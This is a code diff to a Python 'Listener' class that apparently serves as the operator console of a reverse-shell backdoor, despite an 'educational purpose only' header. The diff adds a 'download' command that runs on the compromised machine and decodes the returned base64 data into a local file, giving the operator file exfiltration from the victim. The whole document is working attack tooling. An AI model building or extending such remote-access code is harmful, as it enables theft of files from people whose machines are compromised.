@@ -8,6 +8,7 @@ Please use for educational purpose only...
 
 import socket
 import json
+import base64
 
 
 class Listener:
@@ -43,11 +44,20 @@ class Listener:
 
         return self.reliable_receive()
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful."
+
     def run(self):
         while True:
             command = input(">> ")
             command = command.split(" ")
             result = self.execute_remote_command(command)
+
+            if command[0] == "download":
+                result = self.write_file(command[1], result)
+
             print(result)
 
 
